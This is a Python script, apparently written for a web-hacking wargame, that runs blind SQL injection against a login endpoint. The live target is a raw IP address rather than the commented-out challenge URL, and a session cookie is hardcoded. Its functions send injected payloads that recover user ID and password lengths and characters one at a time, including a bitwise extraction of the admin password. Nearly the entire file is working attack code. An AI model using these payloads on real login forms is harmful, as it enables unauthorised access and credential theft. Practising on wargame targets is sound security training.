import requests

#url = 'https://webhacking.kr/challenge/bonus-1/index.php'
url = 'http://104.197.42.200/member/login_ok.php'
cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}

def find_id_len():
    id_len = 0
    while 1:
        id_len=id_len+1
        value = "' or char_length(userid) = {}   -- '".format(id_len) 
        params = {'userid': value, 'userpw': 'test'} 
        response = requests.post(url,data=params, cookies=cookies) 
        print(response.content) 
        print(value) 
        if "wrong password" in response.text: 
            break
    return id_len #id 길이 반환

def find_id_str(id_len):
    id_str = ""
    for len in range(1,id_len+1):
        for ascii in range(97,123): #ascii a~z까지의 값 반복
            value = "' or ascii(substring(id,{},1)) = {} -- '".format(len,ascii)  
            params = {'userid': value, 'userpw': 'test'} 
            response = requests.post(url, data=params, cookies=cookies)  
            print(response.status_code) 
            print(value)  
            if "wrong password" in response.text:  
                id_str+=chr(ascii)+":" 
        id_str+="\n"
    return id_str 

def find_pw_len(id):
    pw_len = 0
    while 1:
        pw_len=pw_len+1
        value = "' or char_length(pw) = {}  and id='{}' -- '".format(pw_len,id)
        params = {'id': value, 'pw': 'test'}
        response = requests.get(url,params=params, cookies=cookies)
        print(response.status_code)
        print(value)
        if "wrong password" in response.text:
            break
    return pw_len 

def find_pw_str(id, pw_len):
    pw_str = ""
    for len in range(1,pw_len+1):
        bincar="" 
        for bit_index in range(1, 9): 
            value = "' or id='{}' and substr(lpad(bin(ascii(substr(pw,{},1))),8,0 ),{},1) = 1 -- ' ".format(id,len,bit_index)
            params = {'id': id ,'pw': value} 
            response = requests.get(url=url, params=params, cookies=cookies) 
            if "wrong password" in response.text:
                bincar += "1" 
            else:
                bincar += "0" 
        print("중간비트값:" + bincar) 
        pw_str+=chr(int(bincar, 2)) 
        print("현재 패스워드" + pw_str) 
    return pw_str # PW 반환


if __name__ == '__main__':
    #admin_len = find_pw_len("admin")
   # guest_len = find_pw_len("guest")
    print("아이디 조합 : \n"+find_id_str(find_id_len()))
    #print("admin_pw : "+find_pw_str(id="admin",pw_len=admin_len)+"\nguest_pw : "+find_pw_str(id="guest",pw_len=guest_len))
